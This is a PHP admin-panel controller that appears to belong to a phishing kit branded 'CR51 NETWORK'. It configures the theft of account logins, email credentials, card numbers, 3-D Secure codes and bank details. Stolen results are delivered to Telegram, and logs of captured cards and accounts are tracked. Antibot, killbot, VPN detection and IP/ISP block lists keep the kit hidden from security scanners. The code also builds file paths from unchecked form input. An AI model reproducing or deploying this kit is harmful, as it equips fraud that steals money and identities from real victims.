<?php
#Mau Ngapain 
#Please Not delete my copyright
#CR51 NETWORK -> www.cr51server.net
defined("ALLOW") or exit('No direct script access allowed');

class Panel
{
    private $_TOKEN = FCPATH . "CR51/Brain/.settings.ini";
    public $goCR51;
    public function __construct()
    {
        $this->goCR51 = new goCR51();
        checkbacklist($this->goCR51->ip_address, 'ip');
        checkbacklist($_SERVER['HTTP_USER_AGENT'], 'ua');
    }
    public function index()
    {
        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'panel/login');
        } else if (!is_file($this->_TOKEN)) {
            header('Location: ' . base_url() . 'install');
            exit();
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else {
            echo view('panel/dashboard');
        }
    }

    public function login()
    {
        if (isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'panel');
        } else if (!is_file($this->_TOKEN)) {
            header('Location: ' . base_url() . 'install');
            exit();
        } else {
            if (isset($_POST['action'])) {
                $token = $_POST['token'];

                if (empty($token)) {
                    $_SESSION["sukses"] = 'swal("Error!", "Please input all fields.", "error");';
                } else if ($token == _config('TOKEN')) {
                    $_SESSION['token'] = $token;
                    header('Location: ' . base_url() . 'panel');
                } else {
                    $_SESSION["sukses"] = 'swal("Error!", "Your License wrong!!", "error");';
                }
            }
            echo view('panel/login');
        }
    }

    public function pengaturan()
    {
        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'panel/login');
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else {
            echo view('panel/pengaturan');
        }
    }
    public function kontak()
    {
        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'panel/login');
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else {
            echo view('panel/kontak');
        }
    }
    public function ip()
    {

        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'panel/login');
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else {
            if (isset($_POST["add"])) {
                $file = 'CR51/Brain/Backlist/' . $_POST['type'] . '.txt';
                $add = trim($_POST['data']);
                if (empty($_POST["data"])) {
                    $_SESSION["sukses"] = 'swal("Goblokk!", "Ya Setidaknya Jangan Kosong Cok!!", "error");';
                } else if (file_exists($file)) {
                    $handle = fopen($file, 'a');
                    fwrite($handle, $add . "\n");
                    fclose($handle);
                    $_SESSION["sukses"] = 'swal("Berhasil!", "' . $add . ' berhasil ditambahkan ke dalam backlist.", "success");';
                } else {
                    $_SESSION["sukses"] = 'swal("Error!", "File tidak ditemukan.", "error");';
                }
            }
            echo view('panel/backlist/ip');
        }
    }
    public function ua()
    {

        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'panel/login');
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else {
            if (isset($_POST["add"])) {
                $file = 'CR51/Brain/Backlist/' . $_POST['type'] . '.txt';
                $add = trim($_POST['data']);
                if (empty($_POST["data"])) {
                    $_SESSION["sukses"] = 'swal("Goblokk!", "Ya Setidaknya Jangan Kosong Cok!!", "error");';
                } else if (file_exists($file)) {
                    $handle = fopen($file, 'a');
                    fwrite($handle, $add . "\n");
                    fclose($handle);
                    $_SESSION["sukses"] = 'swal("Berhasil!", "' . $add . ' berhasil ditambahkan ke dalam backlist.", "success");';
                } else {
                    $_SESSION["sukses"] = 'swal("Error!", "File tidak ditemukan.", "error");';
                }
            }
            echo view('panel/backlist/ua');
        }
    }
    public function isp()
    {

        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'panel/login');
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else {
            if (isset($_POST["add"])) {
                $file = 'CR51/Brain/Backlist/' . $_POST['type'] . '.txt';
                $add = trim($_POST['data']);
                if (empty($_POST["data"])) {
                    $_SESSION["sukses"] = 'swal("Goblokk!", "Ya Setidaknya Jangan Kosong Cok!!", "error");';
                } else if (file_exists($file)) {
                    $handle = fopen($file, 'a');
                    fwrite($handle, $add . "\n");
                    fclose($handle);
                    $_SESSION["sukses"] = 'swal("Berhasil!", "' . $add . ' berhasil ditambahkan ke dalam backlist.", "success");';
                } else {
                    $_SESSION["sukses"] = 'swal("Error!", "File tidak ditemukan.", "error");';
                }
            }
            echo view('panel/backlist/isp');
        }
    }
    public function countrycode()
    {

        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'panel/login');
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else {
            if (isset($_POST["add"])) {
                $file = 'CR51/Brain/Backlist/' . $_POST['type'] . '.txt';
                $add = trim(strtoupper($_POST['data']));
                if (empty($_POST["data"])) {
                    $_SESSION["sukses"] = 'swal("Goblokk!", "Ya Setidaknya Jangan Kosong Cok!!", "error");';
                } else if (file_exists($file)) {
                    $handle = fopen($file, 'a');
                    fwrite($handle, $add . "\n");
                    fclose($handle);
                    $_SESSION["sukses"] = 'swal("Berhasil!", "' . $add . ' berhasil ditambahkan ke dalam backlist.", "success");';
                } else {
                    $_SESSION["sukses"] = 'swal("Error!", "File tidak ditemukan.", "error");';
                }
            }
            echo view('panel/backlist/countrycode');
        }
    }
    public function backlist()
    {

        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'panel/login');
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else {
            if (isset($_POST["delete"])) {

                $file = 'CR51/Brain/Backlist/' . $_POST["nam"] . '.txt';
                $line_number = $_POST["id"];
                $target = $_POST["target"];

                $lines = file($file);
                if (isset($lines[$line_number - 1])) {
                    unset($lines[$line_number - 1]);

                    $fp = fopen($file, 'w');
                    fwrite($fp, implode('', $lines));
                    fclose($fp);
                    $_SESSION["sukses"] = 'swal("Berhasil!", "Data ' . $target . ' berhasil dihapus!", "success");';
                } else {
                    $_SESSION["sukses"] = 'swal("Error!", "Data ' . $target . ' tidak ditemukan", "error");';
                }
            }
            echo view('panel/backlist');
        }
    }
    public function product()
    {
        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'panel/login');
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else {
            echo view('panel/product');
        }
    }
    public function detailsscript()
    {
        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'panel/login');
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else {
            echo view('panel/detailsscript');
        }
    }
    public function customredirect()
    {
        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'panel/login');
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else {
            echo view('panel/customredirect');
        }
    }
    public function update()
    {
        if (isset($_POST['updatesetting'])) {
            $result           = $_POST["result"];
            $parameter           = $_POST["parameter"];
            $redirect           = $_POST["redirect"];
            $antibot           = $_POST["antibot"];
            $killbot           = $_POST["killbot"];
            $getaccount           = $_POST["getaccount"];
            $vpndetect           = $_POST["vpndetect"];
            $getemail           = $_POST["getemail"];
            $get3dscure           = $_POST["get3dscure"];
            $getbank          = $_POST["getbank"];
            $doubleemail           = $_POST["doubleemail"];
            $doublecard          = $_POST["doublecard"];
            $telegram         = $_POST["telegram"];
            $token          = $_POST["token"];
            if (empty($result && $parameter && $redirect && $antibot && $killbot && $telegram && $getaccount && $vpndetect && $getemail && $get3dscure && $getbank && $doubleemail && $doublecard)) {
                $_SESSION["sukses"] = 'swal("Goblokk!", "Ya Setidaknya Jangan Kosong Cok!!", "error");';
                echo json_encode(array("status" => "Please input all fields.", "site" => "https://www.cr51server.net"));
                header('Location: ' . base_url() . 'panel/pengaturan');
                exit();
            } else if (_config('TOKEN') !== $token) {
                $_SESSION["sukses"] = 'swal("Error!", "Mohon Muat ulang browser anda", "error");';
                echo json_encode(array("status" => "edit not successful.", "site" => "https://www.cr51server.net"));
                header('Location: ' . base_url() . 'panel/pengaturan');
                exit();
            } else if (_config('TOKEN') !== $_SESSION['token']) {
                $_SESSION["sukses"] = 'swal("Error!", "session not detect.", "error");';
                echo json_encode(array("status" => "session not detect.", "site" => "https://www.cr51server.net"));
                header('Location: ' . base_url() . 'panel/logout');
                exit();
            } else {
                $f = fopen(FCPATH . "CR51/Brain/.settings.ini", "w");
                fwrite($f, "TOKEN = \"$token\"\nRESULT = \"$result\"\nPARAMETER = \"$parameter\"\nTelegram = \"$telegram\"\nNOTFOUND = \"$redirect\"\nANTIBOT = \"$antibot\"\nKILLBOT = \"$killbot\"\nGETACCOUNT = \"$getaccount\"\nVPNDETECT = \"$vpndetect\"\nGETEMAIL = \"$getemail\"\nGET3DSCURE = \"$get3dscure\"\nGETBANK = \"$getbank\"\nDOUBLEEMAIL = \"$doubleemail\"\nDOUBLECARD = \"$doublecard\"\n");
                fclose($f);
                $_SESSION["sukses"] = 'swal("Good Job!", "Berhasil Update.", "success");';
                echo json_encode(array("status" => "Update successful."));
                header('Location: ' . base_url() . 'panel/pengaturan');
                exit();
            }
        }

        if (isset($_POST['gasreset'])) {
            $resetlog = $_POST['resetlog'];

            if (empty($resetlog)) {
                $_SESSION["sukses"] = 'swal("Error!", "System error.", "error");';
                echo json_encode(array("status" => "System error.", "site" => "https://www.cr51server.net"));
                header('Location: ' . base_url() . 'panel');
                exit();
            } else if (_config('TOKEN') !== $_SESSION['token']) {
                $_SESSION["sukses"] = 'swal("Error!", "session not detect.", "error");';
                echo json_encode(array("status" => "session not detect.", "site" => "https://www.cr51server.net"));
                header('Location: ' . base_url() . 'panel/logout');
                exit();
            } else if ($resetlog == "resetlog") {
                foreach (['log_account.txt', 'log_cc.txt', 'log_robot.txt', 'log_email.txt', 'log_click.txt', 'log_bank.txt'] as $filename) {
                    file_put_contents(FCPATH . "CR51/Static/$filename", "");
                }
                $_SESSION["sukses"] = 'swal("Good Job!", "Reset Log Success.", "success");';
                echo json_encode(array("status" => "Reset Log Success.", "site" => "https://www.cr51server.net"));
                header('Location: ' . base_url() . 'panel');
            } else {
                $_SESSION["sukses"] = 'swal("Error!", "System error.", "error");';
                echo json_encode(array("status" => "System error.", "site" => "https://www.cr51server.net"));
                header('Location: ' . base_url() . 'panel');
                exit();
            }
        }

        if (isset($_POST['updatebot'])) {
            $botbot           = $_POST["key"];
            $type           = $_POST["type"];
            if (empty($botbot) && empty($type)) {
                $_SESSION["sukses"] = 'swal("Goblokk!", "Ya Setidaknya Jangan Kosong Cok!!", "error");';
                echo json_encode(array("status" => "Please input all fields.", "site" => "https://www.cr51server.net"));
                header('Location: ' . base_url() . 'panel/' . $type);
                exit();
            } else if (_config('TOKEN') !== $_SESSION['token']) {
                $_SESSION["sukses"] = 'swal("Error!", "session not detect.", "error");';
                echo json_encode(array("status" => "session not detect.", "site" => "https://www.cr51server.net"));
                header('Location: ' . base_url() . 'panel/logout');
                exit();
            } else {
                $f = fopen(FCPATH . "CR51/Brain/" . $type . ".ini", "w");
                fwrite($f, "KEY = \"$botbot\"\n");
                fclose($f);
                $_SESSION["sukses"] = 'swal("Good Job!", "Berhasil Update.", "success");';
                echo json_encode(array("status" => "Update successful."));
                header('Location: ' . base_url() . 'panel/' . $type);
                exit();
            }
        }

        if (isset($_POST['stuptel'])) {
            $token           = $_POST["token"];
            $id           = $_POST["id"];
            if (empty($token) && empty($id)) {
                $_SESSION["sukses"] = 'swal("Goblokk!", "Ya Setidaknya Jangan Kosong Cok!!", "error");';
                echo json_encode(array("status" => "Please input all fields.", "site" => "https://www.cr51server.net"));
                header('Location: ' . base_url() . 'panel/telegram');
                exit();
            } else if (_config('TOKEN') !== $_SESSION['token']) {
                $_SESSION["sukses"] = 'swal("Error!", "session not detect.", "error");';
                echo json_encode(array("status" => "session not detect.", "site" => "https://www.cr51server.net"));
                header('Location: ' . base_url() . 'panel/logout');
                exit();
            } else {
                $f = fopen(FCPATH . "CR51/Brain/telegram.ini", "w");
                fwrite($f, "token = \"$token\"\nidtelegram = \"$id\"\n");
                fclose($f);
                $_SESSION["sukses"] = 'swal("Good Job!", "Berhasil Update.", "success");';
                echo json_encode(array("status" => "Update successful."));
                header('Location: ' . base_url() . 'panel/telegram');
                exit();
            }
        }

        if (isset($_POST['updatelink'])) {
            $lik           = $_POST["lik"];
            if (empty($lik)) {
                $_SESSION["sukses"] = 'swal("Goblokk!", "Ya Setidaknya Jangan Kosong Cok!!", "error");';
                echo json_encode(array("status" => "Please input all fields.", "site" => "https://www.cr51server.net"));
                header('Location: ' . base_url() . 'panel/customredirect');
                exit();
            } else if (_config('TOKEN') !== $_SESSION['token']) {
                $_SESSION["sukses"] = 'swal("Error!", "session not detect.", "error");';
                echo json_encode(array("status" => "session not detect.", "site" => "https://www.cr51server.net"));
                header('Location: ' . base_url() . 'panel/logout');
                exit();
            } else {
                $f = fopen(FCPATH . "CR51/Brain/redirect.ini", "w");
                fwrite($f, "Redirect = \"$lik\"\n");
                fclose($f);
                $_SESSION["sukses"] = 'swal("Good Job!", "Berhasil Update", "success");';
                header('Location: ' . base_url() . 'panel/customredirect');
                exit();
            }
        }
    }

    public function antibot()
    {
        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'panel/login');
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else {
            echo view('panel/antibot');
        }
    }
    public function telegram()
    {
        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'panel/login');
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else {
            echo view('panel/telegram');
        }
    }

    public function killbot()
    {
        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'panel/login');
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else {
            echo view('panel/killbot');
        }
    }

    public function static()
    {
        if (!isset($_SESSION['token'])) {
            header('Location: ' . base_url() . 'panel/login');
        } else if (_config('TOKEN') !== $_SESSION['token']) {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else if (_config('TOKEN') == "") {
            header('Location: ' . base_url() . 'panel/logout');
            exit();
        } else {
            echo view('panel/static');
        }
    }

    public function finished()
    {
        echo view('panel/finished');
    }

    public function logout()
    {
        session_start();
        session_destroy();
        echo json_encode(array("status" => "Logout successful", "site" => "https://www.cr51server.net"));
        header('Location: ' . base_url() . '?panel');
    }

    public function logclick()
    {
        if (file_exists(FCPATH . "CR51/Static/log_click.txt")) {
            $bit = file_get_contents(FCPATH . "CR51/Static/log_click.txt");
            $bit = explode("\n", $bit);
            $list = array_reverse($bit);
            echo "<table class=\"table lms_table_active \">
                        <thead>
                            <tr>
                                <th scope=\"col\">Ip</th>
                                <th scope=\"col\">Country</th>
                                <th scope=\"col\">Browser</th>
                                <th scope=\"col\">Keterangan</th>
                                <th scope=\"col\">Jam</th>
                            </tr>
                        </thead>
                        <tbody>";
            foreach ($list as $cr51) {
                $cr51 = explode("|", $cr51);
                $time = $cr51[1];
                $ip = $cr51[2];
                $countryname = $cr51[3];
                $bowser = $cr51[4];
                $keterangan = $cr51[5];
                if ($ip == "") {
                } else {
                    echo "
                                    <tr>
                                        <td>" . $ip . "</td>
                                        <td>" . $countryname . "</td>
                                        <td>" . $bowser . "</td>
                                        <td>" . $keterangan . "</td>
                                        <td>" . $time . "</td>
                                    </tr>";
                }
            }
            echo "
            </tbody>";
        }
    }

    public function json()
    {
        $log_account = file_get_contents(FCPATH . 'CR51/Static/log_account.txt');
        $log_email      = file_get_contents(FCPATH . 'CR51/Static/log_email.txt');
        $log_cc       = file_get_contents(FCPATH . 'CR51/Static/log_cc.txt');
        $log_click      = file_get_contents(FCPATH . 'CR51/Static/log_click.txt');
        $log_robot      = file_get_contents(FCPATH . 'CR51/Static/log_robot.txt');
        $log_bank      = file_get_contents(FCPATH . 'CR51/Static/log_bank.txt');

        $parseAccount = explode("\r\n", $log_account);
        $parseEmail   = explode("\r\n", $log_email);
        $parseCC       = explode("\r\n", $log_cc);
        $parseclick       = explode("\r\n", $log_click);
        $parserobot      = explode("\r\n", $log_robot);
        $parsebank      = explode("\r\n", $log_bank);

        echo json_encode(array(
            'logaccount' => @(int) (count($parseAccount) - 1) ? (int) (count($parseAccount) - 1) : 0,
            'logemail'  => @(int) (count($parseEmail) - 1) ? (int) (count($parseEmail) - 1) : 0,
            'logcard'   => @(int) (count($parseCC) - 1) ? (int) (count($parseCC) - 1) : 0,
            'logclick'   => @(int) (count($parseclick) - 1) ? (int) (count($parseclick) - 1) : 0,
            'logbank'   => @(int) (count($parseclick) - 1) ? (int) (count($parsebank) - 1) : 0,
            'logrobot'   => @(int) (count($parserobot) - 1) ? (int) (count($parserobot) - 1) : 0
        ));
    }
}
